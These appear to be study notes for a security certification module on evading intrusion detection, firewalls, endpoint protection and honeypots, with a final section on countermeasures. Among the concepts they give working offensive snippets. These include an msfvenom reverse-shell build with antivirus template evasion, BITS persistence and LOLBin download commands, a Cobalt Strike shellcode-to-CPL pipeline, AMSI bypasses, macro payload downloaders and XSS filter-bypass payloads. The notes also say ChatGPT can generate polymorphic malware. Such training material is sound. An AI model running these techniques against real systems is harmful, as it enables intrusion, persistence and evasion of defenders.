# Module 12 – Evading IDS, Firewalls, and Honeypots

> Status: ✅ Reference complete

## 1. IDS, IPS, and firewall concepts
### Intrusion Detection System (IDS)
Monitors network traffic for suspicious/malicious activity and alerts. **Passive IDS** detects + alerts only; **Active IDS (IPS)** detects + blocks in real time.
- **Main functions:** monitors for security-policy violations; acts like a packet sniffer (captures TCP/IP packets); analyzes captured packets; raises alerts on intrusions.
- **Placement:** near the firewall — outside (watch incoming threats), inside/near the DMZ (catch internal attacks), or both for layered security. Study the layout and critical areas first, then configure.
- **How it works:** traffic monitoring (sensors scan for known signatures; advanced IDS also detect suspicious behavior) → signature-match action (terminate connections, block IPs, drop packets, alert) → anomaly detection (if no signature matches) → packet forwarding (if clean).

### Intrusion Prevention System (IPS)
Detects **and blocks** attacks; sits inline. Actions: generate alerts on abnormal traffic, record real-time logs, block/filter malicious traffic, detect/eliminate threats quickly inline, identify threats accurately (low false positives). Classified **host-based** and **network-based**. Advantages over IDS: can block/drop illegal packets, monitor a single org's activities, control traffic volume to prevent direct attacks.

### How an IDS detects intrusions (3 methods)
- **Signature recognition (misuse detection)** — match traffic to predefined attack patterns ("signatures"). Good for known threats; false positives if normal packets match; more signatures → slower/more bandwidth; small code changes bypass it.
- **Anomaly detection** — compare current activity to a model of normal behavior; flag deviations. Challenge: building an accurate "normal" model; works best tailored to the network.
- **Protocol anomaly detection** — check if traffic follows standard protocol rules. Baseline normal behavior → flag strange packet formats/out-of-order sequences/slow responses/protocol misuse → use predefined rules to decide anomalies.

### General indications of intrusion
- **File system:** unknown files/programs; privilege escalation (changed permissions); file attribute changes (size/owner/perms); rogue SUID/SGID files; strange/double-extension file names (file.txt.exe); missing files; disk-space drops; system lag/crashes; bandwidth drain.
- **Network:** high bandwidth usage; service probing; unknown IP connection attempts; multiple failed logins; heavy log generation; unexpected network/firewall changes; slowness/crashes; strange outbound traffic.
- **System:** short/incomplete logs; slow performance; missing/misconfigured logs; modified system files; strange text/graphics; missing audit records; unexpected reboots/crashes; unknown running processes; AV/IDS alerts; unauthorized software; strange files/artifacts.

### Types of IDS
- **NIDS (network-based)** — monitors all incoming traffic, inspects each packet, alerts at IP/app level, logs; placed across the network (routers), promiscuous mode; catches DoS, port scans, hacking; assigns threat levels.
- **HIDS (host-based)** — monitors individual systems (desktops/servers); detects unauthorized actions (file changes, insider threats); strong on Windows, also UNIX; resource-heavy.

### Types of IDS alerts
- **True Positive** (attack → alert) — correct.
- **False Positive** (no attack → alert) — mistakes normal activity as malicious (alert fatigue).
- **False Negative** (attack → no alert) — dangerous, threats go unnoticed.
- **True Negative** (no attack → no alert) — correct silence.

### Firewall
Hardware/software at the gateway between a private and public network; monitors/filters traffic by predefined rules; blocks unauthorized access, logs attempts, alerts admins.

**Firewall architecture:**
- **Bastion host** — hardened computer bridging internet↔internal network; two interfaces (public + private).
- **Screened subnet / DMZ** — a protected network between internet and internal, via a three-homed firewall (internet / DMZ / internal); handles public requests while hiding internal network. (Safer: two firewalls — one internet↔DMZ, one DMZ↔internal.)
- **Multi-homed firewall** — multiple NICs connecting to two+ networks; >3 interfaces separate systems by security need.
- **DMZ** — buffer zone holding public-facing services (email/web/FTP); firewall with interfaces for internal/DMZ/internet.

**Types by configuration:** **network-based** (edge, packet filtering, Cisco ASA/FortiGate — pros: security, speed, minimal interference; cons: expensive, complex, space/cabling) vs **host-based** (on a device, Norton/McAfee/Kaspersky — pros: cheaper, home use, easy config; cons: uses resources, hard to uninstall, not for fast-response needs).

**Types by working mechanism** (with OSI layer): packet filtering (network/transport), circuit-level gateways (session), application-level firewall (application), stateful multilayer inspection (combines), application proxies (application), NAT (network), VPN (all layers).
- **Packet filtering** — checks each packet by source/dest IP, source/dest port, TCP flags, protocol, direction, interface; network/internet layer; header-only.
- **Circuit-level gateway** — session/transport layer; checks if a session (TCP handshake) is valid, not individual packets; hides internal network; cost-effective.
- **Application-level (proxy) firewall** — application layer; inspects actual content (HTTP GET/POST); allows only supported services. Features: smart traffic filtering, user-based control, content caching. Modes: **active** (detects + blocks) and **passive** (detects + reports, like an IDS).
- **Stateful multilayer inspection** — combines packet-filtering + circuit-level + application-level; tracks session state; deep packet inspection (e.g. Cisco PIX).
- **Application proxy** — gateway filtering by service (FTP proxy allows only FTP); middleman; caches. Pros: better logging, reduced load, user auth, hides IP weaknesses. Cons: slower adoption, multiple servers needed, client changes.
- **NAT** — hides internal IPs by translating to public; acts as a basic firewall (allows outbound, blocks unsolicited inbound). Schemes: static (one-to-one), dynamic (no port change), NAPT/PAT (port mapping), dynamic PAT (most efficient).
- **VPN** — secure encrypted tunnel over the internet; encrypts + encapsulates + integrity-checks; firewalls often include VPN features.
- **NGFW** — deep inspection across OSI layers, app awareness, built-in IPS, cloud threat intel. Pros: all-in-one, better visibility, smart detection. Cons: high cost, complex management, possible latency.

**Firewall limitations:** can block useful services (FTP/Telnet); can't stop insider attacks; single point of focus; bottleneck; can't detect social engineering / malicious email; infected external devices spread malware inside; zero-days bypass; can't fix poor network design; not an AV replacement; doesn't block high-level protocol attacks; can't always detect threats on common ports/apps; no protection from dial-up; encrypted/tunneled traffic passes unnoticed.

## 2. IDS, IPS, and firewall solutions
### YARA (intrusion detection)
Detects/identifies malware via custom pattern rules (Windows/macOS/Linux). A rule has three parts: **metadata** (author/description/purpose), **strings** (text/hex/regex patterns), **condition** (Boolean logic).
```text
rule silent_banker : banker {
    meta:
        description = "This is just an example"
        threat_level = 3
        in_the_wild = true
    strings:
        $a = { 6A 40 68 00 30 00 00 6A 14 8D 91 }
        $b = { 8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9 }
        $c = "UVODFRYSIHLNWPEJXQZAKCBGMT"
    condition:
        $a or $b or $c
}
```
**YARA tools:** yarGen (`pip install -r requirements.txt`; `python yarGen.py --help` — finds unique malware strings, removes goodware strings), Vovk, Halogen, YARA Silly Silly, yara-forge, YaraRET.

### Snort (IDS/IPS)
Free open-source; monitors traffic in real time via libpcap/Winpcap; promiscuous mode. Uses: straight packet sniffer (like tcpdump), packet logger, NIPS. A rule describes any policy violation, known attacks, or suspicious packets.
- **Rule structure:** keep rules short, one line; split into **Rule Header** (action, protocol, source/dest IP + port, CIDR block) and **Rule Options** (alert messages + inspected part of packet).
- **Rule actions:** alert, log, pass, drop, reject, sdrop.
- **IP protocols:** TCP (connect/exchange data), UDP (broadcast messages), ICMP (OS error messages).
- **Direction operator:** `->` one-way; `<>` bidirectional.
- **IP addresses:** exact, `any`, CIDR, `!` negation, lists `[192.168.1.1,192.168.1.45,10.1.1.24]`.
- **Port numbers:** specific, ranges with `:`, `any`, `!` negation.
```text
log tcp !192.168.1.0/24 any <> 192.168.1.0/24 23
alert tcp !192.168.1.0/24 any -> 192.168.1.0/24 111 (content:"|00 01 86 a5|"; msg:"external mountd access";)
log tcp any -> 192.168.1.0/24 !6000:6010          # all TCP except ports 6000-6010
log udp any -> 192.168.1.0/24 1:1024              # UDP from any port to dest ports 1-1024
log tcp any -> 192.168.1.0/24 :5000               # TCP to ports <= 5000
log tcp any :1024 -> 192.168.1.0/24 400:          # well-known src ports to dest >= 400
```
- **Suricata** — IDS/IPS + network monitoring; live/offline analysis, Lua scripting, YAML/JSON, integrates with SIEM/Splunk/Logstash/Kibana.
- **Other IDS:** Juniper IDP, Samhain HIDS, OSSEC, Zeek, Cisco Secure IPS.
- **IPS tools:** Trellix IPS, Check Point Quantum IPS, Atomic OSSEC, McAfee Host IPS, Cisco Secure IPS (NGIPS), Palo Alto Advanced Threat Prevention.
- **Firewalls (network):** Cisco Secure Firewall ASA, PA-7500, FortiGate 7121F, Check Point 28000 Quantum, Juniper SRX. **(host):** Microsoft Defender Firewall, ZoneAlarm Pro, Comodo, Norton Smart Firewall, McAfee. **(mechanism):** IPFire, pfSense, SonicWall TZ, BIG-IP AFM, Sophos Firewall, WatchGuard Firebox, FortiProxy.

## 3. IDS/firewall evasion techniques

### IDS/firewall identification
- **Port scanning** — find open ports and detect defenses by the ports they use (ManageEngine Firewall Analyzer UDP 514/TCP 443; Snort/Suricata on TCP 80/UDP 53).
- **Firewalking** — send packets with crafted TTL values; a packet just past the firewall triggers an ICMP "TTL exceeded", revealing allowed ports/services (Firewalk, Nmap firewalk scripts).
- **Banner grabbing** — connect to open services (FTP/Telnet/HTTP) to read banners (software name/version/config): `telnet mail.targetcompany.org 25`. Secure/close services with banners.

### Evasion techniques
- **IP address spoofing** — forge the source IP to look like a trusted source and bypass IP filters (Hping). *Host A sends to Host B with source spoofed as trusted Host C → B accepts.*
- **Source routing** — sender specifies the packet's route (loose: some key points; strict: full path) to avoid monitored routers.
- **Tiny fragments** — split a malicious packet into tiny fragments so the TCP header is split; if the IDS only checks the first fragment, the rest slips through (`nmap -sS -T4 -A -f -v <target>`).
- **IP instead of URL** — enter a site's IP directly to bypass basic name blocks (Host2ip); fails if the IP is also blocked.
- **Anonymous surfing sites** — proxy sites that hide the real IP + URL encryption (anonymize.com, kproxy, proxify, proxysite, anonymouse.org).
- **Proxy server** — configure LAN proxy settings (Control Panel → Internet Options → Connections → LAN settings → proxy IP:port, default 8080; "Bypass proxy for local addresses").
- **ICMP tunneling** — hide payload in ICMP Echo data (usually uninspected); run commands / backdoor shell through the payload (ICMPTX).
- **ACK tunneling** — hide payload in ACK packets (firewalls trust ACKs in established sessions); run backdoors (Hping/Nping).
- **HTTP tunneling** — hide traffic inside port-80 HTTP (usually allowed, often uninspected) for blocked apps (FTP/chat/games). Tools: Chisel, **HTTPort + HTTHost** (SSL/CONNECT mode faster/less secure; Remote-host mode slower/more secure via HTTHost helper outside the network), Tunna. *Steps: disable IIS Admin/WWW services; run HTTHost with password, "Revalidate DNS names"/"Log connections"; confirm "Listener: listening at :90"; create a firewall outbound rule to block port 21; configure HTTPort proxy (HTTHost IP, port 90, password); add port mapping; Start → `ftp 127.0.0.1` connects despite the firewall rule.*
- **SSH tunneling** — wrap blocked/unencrypted traffic inside SSH (OpenSSH): `ssh -f user@certifiedhacker.com -L 5000:certifiedhacker.com:25 -N` (`-f` background, `-L` local-port fwd to SMTP 25, `-N` no remote command). **Bitvise** port forwarding: Local (redirect local port → remote service), Remote (expose a local service to a remote system), Dynamic (SOCKS proxy on 127.0.0.1:1080).
- **DNS tunneling** — hide data inside DNS queries/responses over port 53 (trusted, 255-byte UDP limit; DNSSEC can't detect). Tools: **iodine** (iodined server on public IP decodes + fetches internet; iodine client converts traffic to DNS queries), dnscat2.
- **External systems** — bypass from an external system with internal access (employee's home machine, remote-admin machine, off-site company machine): sniff user traffic → steal session ID/cookies → access via the running Mozilla process → `OpenURL()` → redirect browser to attacker server → download/execute malicious code.
- **MITM attacks** — target DNS servers (hijack / fake DNS responses): DNS poisoning → user requests site → corporate DNS returns attacker IP → user hits attacker server → attacker tunnels HTTP traffic to appear legit → malicious code executed.
- **Content** — hide malicious code in harmless-looking files (steganography/obfuscation): infected email attachments, Office docs with macros, Trojan files. Formats: EXE, COM, BAT, PS, PDF, CDR, DVB/DWG (AutoCAD), SMM, DOC/DOT/CNV/ASD (Word), XLS/XLB/XLT (Excel), ADP/MDB/MDE (Access), VSD (Visio), MPP/MPT (Project), PPT/PPS/POT (PowerPoint), MSG/OTM (Outlook).
- **XSS/WAF bypass:** ASCII values (`String.fromCharCode(97,108,101,114,116,...)`), hex encoding (`%3C%73%63%69%72%70%74%3E...`), case obfuscation (`<sCRiPt>aLeRT("XSS")</sCriPT>`), HTTP header spoofing (`X-Originating-IP/X-Forwarded-For/X-Remote-IP/X-Remote-Addr: 127.0.0.1` via Burp), blacklist detection bypass (use `|| ... group by ... having` instead of `union`/`where`/`limit`), fuzzing/brute-forcing (Assetnote Wordlists, SecLists + random user-agents + proxy chains), abusing SSL/TLS ciphers (find a cipher the server supports but the WAF doesn't — sslscan2, abuse-ssl-bypass-waf.py, curl).
- **HTML smuggling** — hide malicious payload in HTML/JS; the browser builds and downloads the file in-memory via the Blob API (no network fetch → evades firewall/IDS; AV may not scan blob files): `<a href="malicious.doc" download="Myfile.doc">`, or JS `Blob` + `createObjectURL` + `.click()`. Signs: ZIP with JavaScript, encrypted attachment, suspicious script in HTML, Base64-decoded HTML. Countermeasures: block auto-exec of .js/.jse, O365 filtering, perimeter checks, Defender SmartScreen, cloud AI protection, CSP headers, whitelist HTML tags, encode dynamic content.
- **Windows BITS** — abuse Background Intelligent Transfer Service (trusted update service, often ignored): create BITS jobs via `bitsadmin` to download/upload malicious files, run even when browsers are closed. Persistence: `/create persistence`, `/addfile persistence <URL> <path>`, `/SetNotifyCmdLine persistence <path> NULL`, `/resume persistence`. Countermeasures: BitsParser, avoid suspicious downloads, keep updated, monitor Windows-BITS-client/operational log, SIEM, GPO BITS settings, limit job age, audit jobs, limit who can create BITS jobs.

### Other IDS evasion techniques
- **Insertion attack** — send packets the IDS accepts but the target rejects (bad checksum/TTL) → IDS sees "phoneyf" instead of "phf" and misses the attack.
- **Evasion** — send data the host accepts but the IDS misses (drop one byte, hide data in TCP handshake packets).
- **DoS against IDS** — overload CPU/memory/disk/bandwidth; fill disk with fake alerts; crash a central log server.
- **Obfuscating** — Unicode, polymorphic code, steganography; especially over HTTPS.
- **False-positive generation** — flood with harmless-but-suspicious packets to hide real activity.
- **Session splicing** — split data into many tiny packets (+ delays) so the IDS doesn't reassemble/track (Nessus).
- **Unicode evasion** — alternate encodings (`%u2215` for `/`, `%c2%a9` for ©); one char has multiple valid representations → unreliable pattern-matching.
- **Fragmentation attack** — exploit IDS/target reassembly-timeout mismatch. *Scenario 1:* IDS drops fragments after 10s, target waits 20s → send fragments 15s apart (IDS ignores, target reassembles). *Scenario 2:* IDS 60s / victim 30s → send fake frag-2'/frag-4' (victim drops after 30s, IDS holds), then frag-1/frag-3 (IDS discards on checksum mismatch), then valid frag-2/frag-4 (IDS ignores, victim reassembles the malicious packet).
- **TTL attacks** — fake fragment (frag-2') with TTL=1 reaches only the IDS; IDS reassembles with the fake piece (thinks it's safe); real frag-2 with attack code reaches the victim.
- **Urgency flag** — IDS reads all data; the target processes only data after the Urgent Pointer → IDS and target process different data.
- **Invalid RST packets** — fake RST with wrong checksum makes the IDS stop analyzing; the target checks the checksum and ignores it (connection stays alive).
- **Polymorphic shellcode** — encrypted payload + decoder, different each time → signature IDS can't match.
- **ASCII shellcode** — shellcode using only ASCII chars to bypass non-ASCII filters.
- **Application-layer attacks** — hide code in compressed media (images/audio/video) that IDS can't scan properly; integer overflow tricks.
- **Desynchronization** — **Pre-connection SYN** (fake SYN with bad checksum before the real connection → IDS syncs to fake sequence); **Post-connection SYN** (fake SYN after connection → IDS thinks a new connection started, then fake RST desyncs the IDS).
- **DGA (Domain Generation Algorithms)** — generate many random C2 domains (gibberish like isdfcbdjdnfuylt.ru) from a shared seed; types: character-based, PRNG (date/time seed), dictionary-based (readable words), high-collision (mimic real domains/TLDs).
- **Encryption** — SSH/SSL/VPN tunnels hide malicious traffic from NIDS.
- **Flooding** — overload the IDS with noisy traffic, then send the real attack.

## 4. Evading NAC and endpoint security
- **Bypass NAC via VLAN hopping** — trick the switch into a trunk link via DTP (dynamic auto/desirable). **VLANPWN:** `python3 DoubleTagging.py --interface eth0 --nativevlan 1 --targetvlan 20 --victim <IP> --attacker <IP>`; `python3 DTPHijacking.py --interface eth0`.
- **Bypass NAC via pre-authenticated device** — place a device (Raspberry Pi, 2 NICs) between the trusted device and switch so traffic flows through it (**nac_bypass_setup.sh**, FENRIR, NACkered, Silentbridge, BITM).
- **Ghostwriting** — bypass signature AV by binary deconstruction + inserting junk assembly + reconstruction (built-in Metasploit tools). **Ghostwriting.sh:** `cd /opt/ghostwriting/ && sudo ./ghostwriting.sh` (generates Meterpreter reverse-TCP payload, disassembles + adds junk, reassembles, hosts via Python HTTP server on :8000).
- **Application whitelisting bypass** — DLL hijacking: place a fake DLL with the expected name next to a trusted exe; or load via LOLBins `regsvr32.exe /s /n /u /i:"C:\path_to_malicious.dll"`, rundll32.exe, PowerShell.
- **Dechaining macros** (VBScript in Office):
  - **ShellCOM:** `Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")` → `obj.Document.Application.ShellExecute "calc.exe",...`.
  - **XMLDOM:** `CreateObject("Microsoft.XMLDOM")` → load a remote `.xsl` payload → `transformNode`.
  - **WmiPrvse.exe:** `GetObject("winmgmts:...Win32_Process")` → `.Create("calc.exe",...)`.
  - **Scheduled tasks:** `CreateObject("Schedule.Service")` → fake author "McAfee Corporation" → run calc.exe in 30s.
  - **Registry modification:** `GetObject("winmgmts:\\.\root\default:StdRegProv")` → `.SetStringValue ... "...CurrentVersion\Run","key1","value1"`.
  - **Dropping files:** `CreateObject("Scripting.FileSystemObject")` → write a `.bat` into the Startup folder.
  - **Downloading content:** `Microsoft.XMLHTTP` + `Adodb.Stream` → GET putty.exe → save as sample.exe in AppData.
  - **Embed file & drop:** `msfvenom -p "GET", generic/custom PAYLOADFILE=...calc.exe -a x64 --platform windows -f vba-exe`.
- **Clearing memory hooks** — EDR uses memory hooks to monitor behavior; overwrite them with x64dbg (EDR still present but blind). Advanced: custom syscalls/assembly that bypass hooked DLLs.
- **Process injection** — inject into a legitimate process via `VirtualAllocEx()` → `WriteProcessMemory()` → `CreateRemoteThread()`.
- **EDR bypass via LoLBins** — use trusted built-in binaries (Deimos C2 agent): `ConfigSecurityPolicy.exe <http://example.com/payload>` (download), `CustomShellHost.exe` (execute, replaces Explorer.exe).
- **CPL side-loading** — hide malware in `.cpl` Control Panel files (seen as safe); mimic real Control Panel functions; rename malicious DLLs `.cpl` in the registry. **CPLResourceRunner:** Cobalt Strike payload (beacon.bin) → ConvertShellcode.py → `cat shellcode.txt | sed 's/[, ]//g; s/0x//g;' | tr -d '\n' | xxd -p -r | gzip -c | base64 > b64shellcode.txt` → paste into Resources.txt → build maliciousnew.cpl.
- **ChatGPT** — generate polymorphic malware (constantly changing code), Base64 conversion, mutating injectors, file-encryption utilities; C2-driven on-demand code generation; bypass AMSI via hidden Python. Phases: obtaining the code → validation (C2 tests encryption) → execution (`compile()`/`exec()`/`eval()`, then delete code).
- **AV bypass via Metasploit templates:**
  ```bash
  msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=444 -f exe > /home/attacker/Windows.exe
  # test on VirusTotal, then edit template.c: #define SCSIZE 4000 (from 4096)
  i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe
  msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=444 -x /usr/share/metasploit-framework/data/templates/src/pe/exe/evasion.exe -f exe > /home/attacker/bypass.exe
  ```
- **AMSI bypass:** PowerShell downgrade (`powershell -version 2` → run amsiutils), obfuscation (`"Inv"+"o"+"ke"+"-Mimi"+"katz"`; AmsiTrigger to find triggering lines), forcing an error (`AllocHGlobal(9076)` + nullify `amsiSession`/`amsiContext` in `AmsiUtils`), memory hijacking (hook `AmsiScanBuffer` → always `AMSI_RESULT_CLEAN`; `LoadFile("ASBBypass.dll")`, `[Amsi]::Bypass()`).
- **Other endpoint bypass:** hosting phishing on popular infra (AWS/GCP), passing encoded commands (`powershell.exe -EncodedCommand <base64>`), Fast Flux DNS, timing-based/sandbox evasion (sleep patching, delay APIs, time bombs), signed binary proxy execution (rundll32), shellcode encryption (XOR/RC4/AES), reducing entropy (add images/common strings), escaping the local AV sandbox (stall with large prime calcs), disabling ETW (patch `EtwEventWrite` in ntdll.dll), direct system calls (`NtAllocateVirtualMemory` via syscall), spoofing the thread call stack (zero the return address before Sleep), in-memory encryption of beacon (XOR while idle).

## 5. Honeypots
Decoy systems; any interaction is likely malicious. Log attacker actions (port access, keystrokes) for early warning, research, and improving security; need monitoring/maintenance.

**By interaction:**
- **Low-interaction** — mimic basic functions, log limited info (KFSensor — simulates vulnerable services, monitors TCP/UDP/ICMP, alerts on scans/DoS; Honeytrap — listens on requested ports, logs "attack strings", follows FTP/TFTP downloads, tracks HTTP URIs).
- **Medium-interaction** — simulate OS/services, capture more detail, respond to specific commands but no full OS (Cowrie, Honeygrove, Kippo — Cowrie fakes UNIX in medium mode, proxies in high mode).
- **High-interaction** — run real OS + vulnerable software; full access in a controlled environment (**honeynet** — a full attackable network; **honeywall** controls outbound traffic).
- **Pure** — fake systems that mimic a full company network.

**By deployment:** **production** (inside the real network, detect internal threats, low-interaction) vs **research** (govt/military/research, study attackers, not for real-time protection).

**By deception technology:** malware, database (SQLi), spam (open mail servers), email (fake addresses), spider (catch crawlers), honeynets.

**Tools:** HoneyBOT (medium-interaction, Windows), Blumira, NeroSwarm, Valhala, Cowrie, StingBox.

### Detecting honeypots
- **Fingerprint the running service** — `nmap -sV -p 80 <ip>`; honeypots mimicking a service often behave slightly differently.
- **Analyze response time** — honeypots respond slower (logging/monitoring): `nmap -p 80 --scan-delay 1s --max-retries 5 <ip>`.
- **Analyze MAC address** — unusual/unknown OUI suggests a VM/fake system: `arp-scan --interface=eth0 --localnet`.
- **Enumerate unexpected open ports** — `nmap -p- <ip>`; more open ports than normal is suspicious.
- **Analyze system config/metadata** — SSH banners, HTTP headers, OS info, default settings, outdated messages.

### Detecting & defeating specific honeypots
- **Layer 7 tar pits** — slow SMTP responses (detect by response time).
- **Layer 4 tar pits** — fake connection with TCP window size 0 (LaBrea); detect: server keeps ACKing while window stays 0.
- **Layer 2 tar pits** — black-hole unresponsive connections; detect MAC `00:00:0F:FF:FF:FF` or analyze ARP replies.
- **VMware honeypots** — check MAC OUI against VMware ranges.
- **Honeyd** — time-based TCP fingerprinting (SYN handling timing differs).
- **UML (User-Mode Linux)** — check `/proc/mounts`, `/proc/interrupts`, `/proc/cmdline`.
- **Snort_inline** — outgoing packets disappear/altered (GenII honeynets).
- **Fake AP** — only beacon frames with random ESSIDs/BSSIDs, no real traffic.
- **Bait-and-Switch** — analyze RTT, TTL, TCP timestamps.
- **Detection tools:** Send-Safe Honeypot Hunter (checks HTTPS/SOCKS proxy lists for honeypots), SniffingBear.

## 6. IDS/firewall evasion countermeasures
- **Defend against IDS evasion:** shut down malicious ports; traffic normalizer; reassemble fragmented packets; drop spoofed IP packets; update IDS & AV; train users on attack awareness; use TCP FIN/RST to end attacks; deploy honeypots; detect tunneling & obfuscation; behavioral analysis for zero-days/polymorphic.
- **Defend against firewall evasion:** block intruder IPs; deny-all-by-default; separate user ID; secure log storage (remote syslog); regular log monitoring; review all allowed traffic; limit per-IP connections; deep packet inspection (DPI); HTTPS/TLS inspection; zero-trust model.
- **Defend against endpoint evasion:** advanced AI/behavior AV; keep systems updated; least privilege; MFA; network segmentation; application whitelisting; SIEM log monitoring; real-time monitoring; file integrity monitoring (FIM); restrict USB/external devices.
- **Defend against NAC evasion:** strong NAC policies; device profiling; MFA; RBAC; network segmentation; MAC filtering; regular audits; zero-trust; SIEM integration; endpoint protection.
- **Defend against AV evasion:** smart AV (behavior/AI/heuristics); keep updated; real-time protection; EPP/EDR; apply security updates; application whitelisting; segment network; sandbox suspicious files; educate users; limit user privileges.

### Evasion & packet tools
- **IDS/firewall evasion tools:** Traffic IQ Professional (sends normal/attack traffic to test firewalls/IDS/IPS/routers), Nmap, Metasploit, PingRAT, KoviD, Green Tunnel, Hyperion.
- **Packet fragment generators:** Colasoft Packet Builder (custom Ethernet/ARP/IP/TCP/UDP packets, fragmenting), NetScanTools Pro, CommView, Ostinato, WAN Killer, WireEdit.

> Flow: identify the defense (port scan / firewalking / banner grab) → pick an evasion (fragment/spoof/tiny-fragments for IDS; tunnel over ICMP/ACK/HTTP/SSH/DNS for firewalls; encode/obfuscate/cipher-abuse for WAFs; LOLBins/AMSI-bypass/injection/ghostwriting for endpoints) → check for honeypots before committing. Defenders counter with traffic normalization, DPI, TLS inspection, behavioral/AI detection, zero-trust, and layered IDS+firewall+EDR.
